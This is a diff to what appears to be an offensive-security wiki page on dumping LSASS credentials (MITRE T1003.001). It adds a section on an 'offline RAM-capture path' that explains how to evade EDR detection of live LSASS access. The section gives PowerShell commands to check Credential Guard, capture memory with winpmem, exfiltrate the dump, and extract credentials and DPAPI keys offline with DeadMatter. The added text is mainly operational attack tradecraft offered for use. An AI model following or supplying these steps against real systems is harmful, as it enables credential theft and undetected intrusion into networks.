@@ -12,7 +12,7 @@ redirect_from:
 
 **Category:** Credential Access
 **MITRE ATT&CK:** T1003.001 — OS Credential Dumping: LSASS Memory
-**Related:** [Mimikatz](/wiki/tools/mimikatz/), [Credential Guard Bypass](/wiki/concepts/credential-guard-bypass/), [Active Directory Attacks](/wiki/concepts/active-directory-attacks/), [Evasion Techniques](/wiki/concepts/evasion-techniques/)
+**Related:** [Mimikatz](/wiki/tools/mimikatz/), [Credential Guard Bypass](/wiki/concepts/credential-guard-bypass/), [Active Directory Attacks](/wiki/concepts/active-directory-attacks/), [Evasion Techniques](/wiki/concepts/evasion-techniques/), [Offline credential extraction from RAM](/wiki/concepts/offline-credential-extraction/), [DeadMatter](/wiki/tools/deadmatter/)
 
 ## Overview
 LSASS (Local Security Authority Subsystem Service) stores credential material including NT hashes, Kerberos tickets, and (historically) plaintext passwords. On modern systems LSASS runs as PPL (Protected Process Light) and Credential Guard moves secrets to `LsaIso.exe`. Multiple techniques exist to dump LSASS while evading EDR detection.
@@ -79,6 +79,27 @@ pypykatz lsa minidump lsass.dmp
 ```
 
 **Note:** On Windows 11 with Credential Guard enabled, LSASS no longer holds high-value credentials — see [Credential Guard Bypass](/wiki/concepts/credential-guard-bypass/) for bypass techniques.
+
+## Offline RAM-Capture Path (Avoid Live LSASS Access)
+
+A second strategy avoids touching LSASS at all on the live target. Capture full physical memory with a signed forensic acquisition tool (FTK Imager, WinPMEM, Magnet RAM Capture), exfiltrate, and parse offline on the attacker's box. EDR detections calibrated for live LSASS access — `OpenProcess`/`MiniDumpWriteDump`/Sysmon 10 — see a contiguous physical-memory sweep instead, which a forensic tool legitimately performs and which mature programs sometimes allow-list.
+
+```powershell
+# 1. Verify Credential Guard is off (otherwise LSASS won't hold creds)
+PS > Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# 2. Acquire RAM with FTK Imager → "Capture Memory" (UI), or:
+PS > .\winpmem.exe -o memory_dump.raw
+
+# 3. Compress and exfiltrate (32GB → ~8-12GB)
+
+# 4. Extract offline with DeadMatter on the attacker host
+PS > Deadmatter.exe -f memory_dump.raw          # structured + carving
+PS > Deadmatter.exe -f memory_dump.raw -m carve  # signature-carve only
+PS > Deadmatter.exe -f memory_dump.raw -b -d     # creds + DPAPI keys + IV brute
+```
+
+See [Offline credential extraction from RAM](/wiki/concepts/offline-credential-extraction/) and [DeadMatter](/wiki/tools/deadmatter/) for the full pattern, gating conditions (Credential Guard, allow-listed DFIR tooling, DLP), and acquisition/extraction tool comparisons.
 
 ## Detection
 
